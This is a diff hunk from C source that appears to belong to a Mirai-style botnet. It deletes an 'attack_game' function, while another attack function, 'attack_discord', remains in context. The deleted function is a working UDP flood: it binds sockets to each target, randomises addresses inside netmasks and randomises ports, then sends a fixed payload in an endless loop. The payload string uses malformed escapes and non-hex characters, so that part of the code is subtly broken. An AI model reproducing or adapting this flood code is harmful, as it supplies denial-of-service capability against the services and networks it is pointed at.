@@ -467,61 +467,6 @@ static ipv4_t get_dns_resolver(void)
     }
 }
 
-void attack_game(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
-{
-
-    int i;
-    char **pkts = calloc(targs_len, sizeof (char *));
-    int *fds = calloc(targs_len, sizeof (int));
-    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
-    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
-    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1294);
-    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
-    struct sockaddr_in bind_addr = {0};
-    if (sport == 0xffff)
-    {
-        sport = rand_next();
-    } else {
-        sport = htons(sport);
-    }
-    for (i = 0; i < targs_len; i++)
-    {
-        struct iphdr *iph;
-        struct udphdr *udph;
-        char *data;
-        pkts[i] = calloc(65535, sizeof (char));
-        if (dport == 0xffff)
-            targs[i].sock_addr.sin_port = rand_next();
-        else
-            targs[i].sock_addr.sin_port = htons(dport);
-        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
-        {
-            return;
-        }
-        bind_addr.sin_family = AF_INET;
-        bind_addr.sin_port = sport;
-        bind_addr.sin_addr.s_addr = 0;
-        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
-        {
-        }
-        if (targs[i].netmask < 32)
-            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
-        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
-        {
-        }
-    }
-    while (TRUE)
-    {
-        for (i = 0; i < targs_len; i++)
-        {
-            char *data = pkts[i];
-            if (data_rand)
-                rand_str(data, data_len);
-            send(fds[i], "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A", 1458, MSG_NOSIGNAL);
-        }
-    }
-}
-
 
 void attack_discord(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
